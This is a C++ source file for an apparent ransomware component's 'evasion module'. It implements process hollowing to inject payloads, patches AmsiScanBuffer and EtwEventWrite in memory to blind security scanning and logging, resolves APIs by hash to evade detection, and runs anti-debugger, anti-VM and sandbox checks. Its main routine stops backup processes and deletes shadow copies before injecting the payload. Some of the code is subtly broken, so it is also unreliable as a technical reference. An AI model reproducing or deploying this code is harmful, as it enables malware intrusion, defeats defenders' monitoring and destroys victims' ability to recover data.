// Moz Crypto Core - Evasion Module Implementation
// Implements process hollowing, direct syscalls, AMSI bypass, anti-analysis

#include "moz_evasion.h"
#include "moz_crypto.h"

#ifdef _WIN32
#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <winternl.h>
#include <bcrypt.h>
#else
#include <cstdint>
#include <cstring>
#endif

#include <cstdint>
#include <cstring>
#include <vector>
#include <string>
#include <iostream>

namespace moz {

#ifdef _WIN32
// ==================== Direct Syscall Stubs (Windows) ====================
// Hash-based API resolution - avoids detection via API name strings
// Technique adapted from xaitax/Chrome-App-Bound-Encryption-Decryption

namespace {

// ROR13 hash function (same as used in the reference implementation)
constexpr DWORD ror13(DWORD d, int n) {
    return (d >> n) | (d << (32 - n));
}

constexpr DWORD calc_hash(const char* str) {
    DWORD h = 0;
    while (*str) {
        h = ror13(h, 13);
        h += *str++;
    }
    return h;
}

// Pre-computed hashes for target Windows APIs
constexpr DWORD H_KERNEL32       = calc_hash("kernel32.dll");
constexpr DWORD H_NTDLL          = calc_hash("ntdll.dll");
constexpr DWORD H_LOADLIBRARYA   = calc_hash("LoadLibraryA");
constexpr DWORD H_GETPROCADDRESS = calc_hash("GetProcAddress");
constexpr DWORD H_CREATPROCESSW  = calc_hash("CreateProcessW");
constexpr DWORD H_TERMINATEPROCESS = calc_hash("TerminateProcess");
constexpr DWORD H_OPENC_PROCESS  = calc_hash("OpenProcess");
constexpr DWORD H_VIRTUALALLOCEX = calc_hash("VirtualAllocEx");
constexpr DWORD H_WRITEPROCESSMEMORY = calc_hash("WriteProcessMemory");
constexpr DWORD H_READPROCESSMEMORY = calc_hash("ReadProcessMemory");
constexpr DWORD H_SETTHREADCONTEXT = calc_hash("SetThreadContext");
constexpr DWORD H_GETTHREADCONTEXT = calc_hash("GetThreadContext");
constexpr DWORD H_RESUMETHREAD   = calc_hash("ResumeThread");
constexpr DWORD H_GETMODULEHANDLEW = calc_hash("GetModuleHandleW");
constexpr DWORD H_ISDEBUGGERPRESENT = calc_hash("IsDebuggerPresent");
constexpr DWORD H_CHECKREMOTEDEBUGGER = calc_hash("CheckRemoteDebuggerPresent");

// NTAPI function pointer types
using NtAllocateVirtualMemory_t = NTSTATUS(NTAPI*)(
    HANDLE, PVOID*, PULONG, PSIZE_T, ULONG, ULONG);
using NtWriteVirtualMemory_t = NTSTATUS(NTAPI*)(
    HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
using NtReadVirtualMemory_t = NTSTATUS(NTAPI*)(
    HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
using NtProtectVirtualMemory_t = NTSTATUS(NTAPI*)(
    HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
using NtCreateThreadEx_t = NTSTATUS(NTAPI*)(
    PHANDLE, ACCESS_MASK, OBJECT_ATTRIBUTES*, HANDLE, PVOID, 
    PVOID, BOOLEAN, ULONG, SIZE_T, SIZE_T, PPS_APC_RESERVED, 
    PPS_DLL_INIT_CALLBACK);
using NtQueryInformationProcess_t = NTSTATUS(NTAPI*)(
    HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);

// PEB structures for manual DLL resolution
struct UNICODE_STR {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR Buffer;
};

struct LDR_DATA_TABLE_ENTRY_LITE {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STR FullDllName;
    UNICODE_STR BaseDllName;
};

struct PEB_LDR_DATA_LITE {
    ULONG Length;
    BOOLEAN Initialized;
    HANDLE SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
};

struct PEB_LITE {
    BOOLEAN InheritedAddressSpace;
    BOOLEAN ReadImageFileExecOptions;
    BOOLEAN BeingDebugged;
    BOOLEAN BitField;
    HANDLE Mutant;
    PVOID ImageBaseAddress;
    PEB_LDR_DATA_LITE* Ldr;
};

// Get PEB base address
PVOID get_peb() {
#if defined(_M_X64)
    return reinterpret_cast<PVOID>(__readgsqword(0x60));
#elif defined(_M_ARM64)
    return reinterpret_cast<PVOID>(__readx18qword(0x60));
#else
    return nullptr;
#endif
}

// Find module base by hash (avoids string-based API calls)
PVOID find_module_by_hash(DWORD hash) {
    auto peb = reinterpret_cast<PEB_LITE*>(get_peb());
    if (!peb || !peb->Ldr) return nullptr;
    
    auto head = &peb->Ldr->InMemoryOrderModuleList;
    auto curr = head->Flink;
    
    while (curr != head) {
        auto entry = CONTAINING_RECORD(curr, LDR_DATA_TABLE_ENTRY_LITE, InMemoryOrderLinks);
        
        if (entry->BaseDllName.Length > 0) {
            // Calculate hash of module name (case insensitive)
            DWORD h = 0;
            USHORT len = entry->BaseDllName.Length;
            BYTE* buf = reinterpret_cast<BYTE*>(entry->BaseDllName.Buffer);
            
            while (len--) {
                BYTE c = *buf++;
                if (c >= 'a' && c <= 'z') c -= 0x20;
                h = ror13(h, 13);
                h += c;
            }
            
            if (h == hash) {
                return entry->DllBase;
            }
        }
        curr = curr->Flink;
    }
    
    return nullptr;
}

// Get export address by hash from a module
PVOID get_export_by_hash(PVOID module_base, DWORD hash) {
    auto dos = reinterpret_cast<PIMAGE_DOS_HEADER>(module_base);
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return nullptr;
    
    auto nt = reinterpret_cast<PIMAGE_NT_HEADERS>(
        reinterpret_cast<BYTE*>(module_base) + dos->e_lfanew);
    
    auto exp_dir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!exp_dir->Size) return nullptr;
    
    auto exports = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(
        reinterpret_cast<BYTE*>(module_base) + exp_dir->VirtualAddress);
    
    auto names = reinterpret_cast<PDWORD>(
        reinterpret_cast<BYTE*>(module_base) + exports->AddressOfNames);
    auto funcs = reinterpret_cast<PDWORD>(
        reinterpret_cast<BYTE*>(module_base) + exports->AddressOfFunctions);
    auto ords = reinterpret_cast<PWORD>(
        reinterpret_cast<BYTE*>(module_base) + exports->AddressOfNameOrdinals);
    
    for (DWORD i = 0; i < exports->NumberOfNames; i++) {
        char* name = reinterpret_cast<char*>(
            reinterpret_cast<BYTE*>(module_base) + names[i]);
        
        if (calc_hash(name) == hash) {
            return reinterpret_cast<PVOID>(
                reinterpret_cast<BYTE*>(module_base) + funcs[ords[i]]);
        }
    }
    
    return nullptr;
}

} // anonymous namespace

#endif // _WIN32

// ==================== ProcessHollowing Implementation ====================

bool ProcessHollowing::isAvailable() {
#ifdef _WIN32
    return true;
#else
    return false;
#endif
}

uint32_t ProcessHollowing::executeViaHollowing(const std::vector<uint8_t>& payload,
                                                 const std::string& targetProcess) {
#ifdef _WIN32
    return hollowViaWinAPI(payload, targetProcess);
#else
    return 0;
#endif
}

uint32_t ProcessHollowing::executeViaHollowing(const std::string& payloadPath,
                                                 const std::string& targetProcess) {
#ifdef _WIN32
    return hollowViaWinAPI(payloadPath, targetProcess);
#else
    return 0;
#endif
}

#ifdef _WIN32

bool ProcessHollowing::hollowViaWinAPI(const std::vector<uint8_t>& payload,
                                         const std::string& targetProcess) {
    // Convert strings to wide char
    std::wstring wTarget(targetProcess.begin(), targetProcess.end());
    std::wstring wCmdLine = L"\"" + wTarget + L"\"";
    
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = {};
    
    // Step 1: Create target process in suspended state
    if (!CreateProcessW(wTarget.c_str(), wCmdLine.data(),
                        nullptr, nullptr, FALSE,
                        CREATE_SUSPENDED, nullptr, nullptr,
                        &si, &pi)) {
        return false;
    }
    
    // Step 2: Allocate memory in target process for payload
    PVOID remoteMem = VirtualAllocEx(pi.hProcess, nullptr, payload.size(),
                                     MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteMem) {
        TerminateProcess(pi.hProcess, 0);
        return false;
    }
    
    // Step 3: Write payload to target process
    if (!WriteProcessMemory(pi.hProcess, remoteMem, payload.data(),
                            payload.size(), nullptr)) {
        TerminateProcess(pi.hProcess, 0);
        return false;
    }
    
    // Step 4: Change memory permissions to executable
    DWORD oldProtect;
    if (!VirtualProtectEx(pi.hProcess, remoteMem, payload.size(),
                          PAGE_EXECUTE_READ, &oldProtect)) {
        TerminateProcess(pi.hProcess, 0);
        return false;
    }
    
    // Step 5: Get thread context and update entry point
    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pi.hThread, &ctx)) {
        TerminateProcess(pi.hProcess, 0);
        return false;
    }
    
    // Step 6: Set new entry point (x64: Rcx, x86: Eip)
#ifdef _M_X64
    ctx.Rcx = reinterpret_cast<DWORD64>(remoteMem);
#else
    ctx.Eip = reinterpret_cast<DWORD>(remoteMem);
#endif
    
    if (!SetThreadContext(pi.hThread, &ctx)) {
        TerminateProcess(pi.hProcess, 0);
        return false;
    }
    
    // Step 7: Resume the hollowed process
    ResumeThread(pi.hThread);
    
    // Close handles
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    
    return true;
}

bool ProcessHollowing::hollowViaWinAPI(const std::string& payloadPath,
                                         const std::string& targetProcess) {
    // Read payload from file
    std::ifstream file(payloadPath, std::ios::binary);
    if (!file.is_open()) return false;
    
    std::vector<uint8_t> payload((std::istreambuf_iterator<char>(file)),
                                  std::istreambuf_iterator<char>());
    file.close();
    
    return hollowViaWinAPI(payload, targetProcess);
}

#endif // _WIN32

// ==================== AMSIBypass Implementation ====================

bool AMSIBypass::bypassAmsiPatching() {
#ifdef _WIN32
    return patchAmsiScanBuffer();
#else
    // AMSI is Windows-only
    return false;
#endif
}

bool AMSIBypass::bypassClrUnhook() {
#ifdef _WIN32
    return unhookProviders();
#else
    return false;
#endif
}

bool AMSIBypass::isAmsiActive() {
#ifdef _WIN32
    HMODULE hAmsi = GetModuleHandleW(L"amsi.dll");
    return hAmsi != nullptr;
#else
    return false;
#endif
}

#ifdef _WIN32

bool AMSIBypass::patchAmsiScanBuffer() {
    // Load amsi.dll and find AmsiScanBuffer
    HMODULE hAmsi = LoadLibraryW(L"amsi.dll");
    if (!hAmsi) return false;
    
    // AmsiScanBuffer signature (Windows 10/11):
    // mov qword ptr [rdx],0x00000000636d6561 (small fix)
    // mov qword ptr [r8],0x00000000636d6561
    // xor eax,eax
    // ret
    // 
    // Patch: replace AmsiScanBuffer with "xor eax,eax; ret"
    // This makes it always return ERROR_SUCCESS without scanning
    
    FARPROC pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!pAmsiScanBuffer) return false;
    
    // Patch with: xor eax, 0x00000000 (2 bytes) + ret (1 byte) = 3 bytes
    // Actually: xor eax,eax (31 C0) + ret (C3) = 3 bytes
    uint8_t patch[] = { 0x31, 0xC0, 0xC3, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 };
    
    DWORD oldProtect;
    if (!VirtualProtect(pAmsiScanBuffer, sizeof(patch), 
                        PAGE_EXECUTE_READWRITE, &oldProtect)) {
        return false;
    }
    
    memcpy(pAmsiScanBuffer, patch, sizeof(patch));
    VirtualProtect(pAmsiScanBuffer, sizeof(patch), oldProtect, &oldProtect);
    
    return true;
}

bool AMSIBypass::unhookProviders() {
    // Unhook ETW providers and CLR hooks
    // This technique prevents EDRs from intercepting .NET activity
    
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) return false;
    
    // Set ETW event write to no-op
    // Patch EtwEventWrite in ntdll
    FARPROC pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pEtwEventWrite) return false;
    
    // Patch: mov eax, 0x00000000 (STATUS_SUCCESS) + ret
    // This makes all ETW events silently succeed without logging
    uint8_t patch[] = { 0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3, 0x90, 0x90, 0x90 };
    
    DWORD oldProtect;
    if (!VirtualProtect(pEtwEventWrite, sizeof(patch),
                        PAGE_EXECUTE_READWRITE, &oldProtect)) {
        return false;
    }
    
    memcpy(pEtwEventWrite, patch, sizeof(patch));
    VirtualProtect(pEtwEventWrite, sizeof(patch), oldProtect, &oldProtect);
    
    return true;
}

#endif // _WIN32

// ==================== AntiAnalysis Implementation ====================

bool AntiAnalysis::isDebuggerPresent() {
#ifdef _WIN32
    // Method 1: PEB BeingDebugged flag
    auto peb = reinterpret_cast<PEB_LITE*>(get_peb());
    if (peb && peb->BeingDebugged) return true;
    
    // Method 2: IsDebuggerPresent API
    using IsDebuggerPresent_t = BOOL(WINAPI*)(VOID);
    auto pIsDebuggerPresent = reinterpret_cast<IsDebuggerPresent_t>(
        get_export_by_hash(find_module_by_hash(H_KERNEL32), H_ISDEBUGGERPRESENT));
    
    if (pIsDebuggerPresent && pIsDebuggerPresent()) return true;
    
    return false;
#else
    // Check for ptrace on Linux (debugging check)
    // This is a simplified cross-platform stub
    return false;
#endif
}

bool AntiAnalysis::checkRemoteDebugger() {
#ifdef _WIN32
    BOOL remoteDebugger = FALSE;
    using CheckRemoteDebuggerPresent_t = BOOL(WINAPI*)(HANDLE, PBOOL);
    auto pCheckRemote = reinterpret_cast<CheckRemoteDebuggerPresent_t>(
        get_export_by_hash(find_module_by_hash(H_KERNEL32), H_CHECKREMOTEDEBUGGER));
    
    if (pCheckRemote) {
        pCheckRemote(GetCurrentProcess(), &remoteDebugger);
    }
    return remoteDebugger;
#else
    return false;
#endif
}

bool AntiAnalysis::checkHeapFlags() {
#ifdef _WIN32
    auto peb = reinterpret_cast<PEB_LITE*>(get_peb());
    if (!peb) return false;
    
    // Check NtGlobalFlag in PEB (offset varies by Windows version)
    // On x64: PEB + 0x68 contains NtGlobalFlag
    BYTE* peb_bytes = reinterpret_cast<BYTE*>(peb);
    DWORD ntGlobalFlag = *reinterpret_cast<DWORD*>(peb_bytes + 0x68);
    
    // FLG_HEAP_ENABLE_TAIL_CHECK (0x10), FLG_HEAP_ENABLE_DEBUG_OUTPUT (0x20)
    // FLG_HEAP_FREE_CHECK_LIST (0x40)
    return (ntGlobalFlag & 0x70) != 0;
#else
    return false;
#endif
}

bool AntiAnalysis::checkDebugObject() {
#ifdef _WIN32
    using NtQueryInformationProcess_t = NTSTATUS(NTAPI*)(
        HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
    
    auto pQuery = reinterpret_cast<NtQueryInformationProcess_t>(
        get_export_by_hash(find_module_by_hash(H_NTDLL), 
                          calc_hash("NtQueryInformationProcess")));
    
    if (!pQuery) return false;
    
    HANDLE hDebugObject = nullptr;
    NTSTATUS status = pQuery(GetCurrentProcess(), 
                            static_cast<PROCESSINFOCLASS>(30), // ProcessDebugObjectHandle
                            &hDebugObject, sizeof(HANDLE), nullptr);
    
    if (status == 0 && hDebugObject != nullptr) {
        return true;
    }
    return false;
#else
    return false;
#endif
}

bool AntiAnalysis::checkNtGlobalFlag() {
#ifdef _WIN32
    auto peb = reinterpret_cast<PEB_LITE*>(get_peb());
    if (!peb) return false;
    
    BYTE* peb_bytes = reinterpret_cast<BYTE*>(peb);
    DWORD ntGlobalFlag = *reinterpret_cast<DWORD*>(peb_bytes + 0x68);
    
    // Check for FLG_DEBUGGED (0x70) and FLG_STOP_ON_HARDENED_LOAD (0x6F)
    return (ntGlobalFlag & 0x70) != 0;
#else
    return false;
#endif
}

bool AntiAnalysis::isVirtualMachine() {
    return checkHypervisor() || checkHardwareConstants();
}

bool AntiAnalysis::checkHypervisor() {
#ifdef _WIN32
    // Use CPUID to check for hypervisor presence
    // CPUID leaf 1, ECX bit 31 = hypervisor present
    bool hypervisor_present = false;
    
#if defined(_M_X64) || defined(_M_IX86)
    __try {
        int cpuInfo[4] = {};
        __cpuid(cpuInfo, 1);
        hypervisor_present = (cpuInfo[2] & (1 << 31)) != 0;
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        hypervisor_present = false;
    }
#endif
    
    if (!hypervisor_present) return false;
    
    // Get hypervisor vendor string
    // CPUID leaf 0x40000000 returns vendor in EAX, EBX, ECX, EDX
#if defined(_M_X64) || defined(_M_IX86)
    __try {
        int cpuInfo[4] = {};
        __cpuid(cpuInfo, 0x40000000);
        char vendor[13] = {};
        memcpy(vendor, &cpuInfo[1], 4);      // EBX
        memcpy(vendor + 4, &cpuInfo[2], 4);  // ECX
        memcpy(vendor + 8, &cpuInfo[3], 4);  // EDX
        
        if (strstr(vendor, "Microsoft") || 
            strstr(vendor, "VMware") || 
            strstr(vendor, "VirtualBox") ||
            strstr(vendor, "KVM") ||
            strstr(vendor, "Xen")) {
            return true;
        }
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        return false;
    }
#endif
    
    return false;
#else
    // Linux: check /sys/hypervisor/type
    FILE* f = fopen("/sys/hypervisor/type", "r");
    if (f) {
        char buf[64] = {};
        fgets(buf, sizeof(buf), f);
        fclose(f);
        if (strstr(buf, "xen") || strstr(buf, "kvm")) {
            return true;
        }
    }
    return false;
#endif
}

bool AntiAnalysis::checkHardwareConstants() {
#ifdef _WIN32
    // Check for known VM hardware signatures
    // VMware: "VMware" in registry or device names
    // VirtualBox: "VBOX" in hardware strings
    
    // Check disk vendor via DeviceIoControl
    // Simplified: check for common VM registry keys
    
    HKEY hKey;
    LONG result = RegOpenKeyExW(HKEY_HARDWARE, 
        L"DESCRIPTION\\System\\CentralProcessor\\0\\Identifier",
        0, KEY_READ, &hKey);
    
    if (result == ERROR_SUCCESS) {
        char buffer[256] = {};
        DWORD size = sizeof(buffer);
        DWORD type;
        
        if (RegQueryValueExA(hKey, "", nullptr, &type, 
            reinterpret_cast<LPBYTE>(buffer), &size) == ERROR_SUCCESS) {
            RegCloseKey(hKey);
            
            // Common VM CPU identifiers
            if (strstr(buffer, "GenuineIntel") == nullptr && 
                strstr(buffer, "AuthenticAMD") == nullptr) {
                return true;
            }
        } else {
            RegCloseKey(hKey);
        }
    }
    
    return false;
#else
    return false;
#endif
}

bool AntiAnalysis::checkTimingAnomalies() {
    // Check for VM timing inconsistencies
    // VMs often have measurable timing differences
    
#ifdef _WIN32
    LARGE_INTEGER start, end, freq;
    QueryPerformanceFrequency(&freq);
    
    // Measure 1000 iterations
    uint64_t deltas[1000];
    for (int i = 0; i < 1000; i++) {
        QueryPerformanceCounter(&start);
        __asm { }; // Compiler barrier
        QueryPerformanceCounter(&end);
        
        deltas[i] = end.QuadPart - start.QuadPart;
    }
    
    // Calculate variance
    uint64_t sum = 0;
    for (int i = 0; i < 1000; i++) {
        sum += deltas[i];
    }
    uint64_t avg = sum / 1000;
    
    uint64_t variance = 0;
    for (int i = 0; i < 1000; i++) {
        uint64_t diff = deltas[i] > avg ? deltas[i] - avg : avg - deltas[i];
        variance += diff;
    }
    variance /= 1000;
    
    // High variance can indicate VM/synthetic timing
    return variance > (avg * 10);
#else
    // Linux: use clock_gettime for timing
    #include <time.h>
    struct timespec start_ts, end_ts;
    uint64_t deltas[1000];
    
    for (int i = 0; i < 1000; i++) {
        clock_gettime(CLOCK_MONOTONIC, &start_ts);
        asm volatile("" ::: "memory"); // Compiler barrier
        clock_gettime(CLOCK_MONOTONIC, &end_ts);
        
        uint64_t start_ns = start_ts.tv_sec * 1000000000ULL + start_ts.tv_nsec;
        uint64_t end_ns = end_ts.tv_sec * 1000000000ULL + end_ts.tv_nsec;
        deltas[i] = end_ns - start_ts.tv_nsec;
    }
    
    uint64_t sum = 0;
    for (int i = 0; i < 1000; i++) sum += deltas[i];
    uint64_t avg = sum / 1000;
    
    uint64_t variance = 0;
    for (int i = 0; i < 1000; i++) {
        uint64_t diff = deltas[i] > avg ? deltas[i] - avg : avg - deltas[i];
        variance += diff;
    }
    variance /= 1000;
    
    return variance > (avg * 10);
#endif
}

#ifdef _WIN32
bool AntiAnalysis::checkPebFlags() {
    auto peb = reinterpret_cast<PEB_LITE*>(get_peb());
    if (!peb || !peb->Ldr) return false;
    
    // Walk loaded modules — VMs/sandboxes may have fewer or unusual modules
    int module_count = 0;
    auto head = &peb->Ldr->InMemoryOrderModuleList;
    auto curr = head->Flink;
    
    while (curr != head) {
        module_count++;
        curr = curr->Flink;
    }
    
    // VMs typically have fewer loaded modules
    return module_count < 10;
}
#endif

bool AntiAnalysis::isBeingAnalyzed() {
    // Combine all checks
    if (isDebuggerPresent()) return true;
    if (checkRemoteDebugger()) return true;
    if (checkHeapFlags()) return true;
    if (checkDebugObject()) return true;
    if (checkNtGlobalFlag()) return true;
    if (isVirtualMachine()) return true;
    if (checkTimingAnomalies()) return true;
#ifdef _WIN32
    if (checkPebFlags()) return true;
#endif
    return false;
}

bool AntiAnalysis::isSandbox() {
    // Sandbox-specific checks
#ifdef _WIN32
    // Check for low uptime (< 5 minutes typically indicates sandbox)
    DWORD uptime = GetTickCount();
    if (uptime < 300000) return true; // Less than 5 minutes uptime
#else
    // Linux: check /proc/uptime
    FILE* f = fopen("/proc/uptime", "r");
    if (f) {
        double uptime = 0;
        fscanf(f, "%lf", &uptime);
        fclose(f);
        if (uptime < 300.0) return true; // Less than 5 minutes uptime
    }
#endif
    return false;
}

// ==================== EvasionManager Implementation ====================
EvasionManager::EvasionManager() {}
EvasionManager::~EvasionManager() {}

bool EvasionManager::runAntiAnalysis() const {
    log("Running anti-analysis checks...");
    
    bool analyzed = AntiAnalysis::isBeingAnalyzed();
    
    if (analyzed) {
        log("Analysis environment detected!");
        if (!force_evasion_) {
            return false; // Abort execution
        }
        log("Force evasion enabled - continuing despite analysis detection");
    } else {
        log("No analysis environment detected");
    }
    
    return true;
}

bool EvasionManager::applyAMSIBypass() const {
    log("Applying AMSI bypass...");
    
    bool result1 = AMSIBypass::bypassAmsiPatching();
    log("  AMSI patch: " + std::string(result1 ? "OK" : "FAILED"));
    
    bool result2 = AMSIBypass::bypassClrUnhook();
    log("  CLR unhook: " + std::string(result2 ? "OK" : "FAILED"));
    
    return result1 || result2; // At least one should succeed
}

bool EvasionManager::executeThroughHollowing(const std::vector<uint8_t>& payload,
                                               const std::string& targetProcess) const {
    log("Executing via process hollowing: " + targetProcess);
    
    uint32_t pid = ProcessHollowing::executeViaHollowing(payload, targetProcess);
    
    if (pid > 0) {
        log("  Process hollowing succeeded (PID: " + std::to_string(pid) + ")");
        return true;
    } else {
        log("  Process hollowing failed");
        return false;
    }
}

bool EvasionManager::runEvasionAndExecute(const std::vector<uint8_t>& payload,
                                            const std::string& targetProcess) const {
    // Step 1: Anti-analysis
    if (!runAntiAnalysis()) {
        return false;
    }
    
    // Step 2: Stop backup processes/services
    log("Stopping backup processes...");
    AntiRecovery::stopBackupProcesses();
    
    // Step 3: Delete shadow copies
    log("Deleting volume shadow copies...");
    AntiRecovery::deleteShadowCopies();
    
    // Step 4: AMSI bypass
    applyAMSIBypass();
    
    // Step 5: Execute via process hollowing
    return executeThroughHollowing(payload, targetProcess);
}

void EvasionManager::log(const std::string& message) const {
    if (verbose_) {
        std::cout << "[Evasion] " + message << std::endl;
    }
}

} // namespace moz
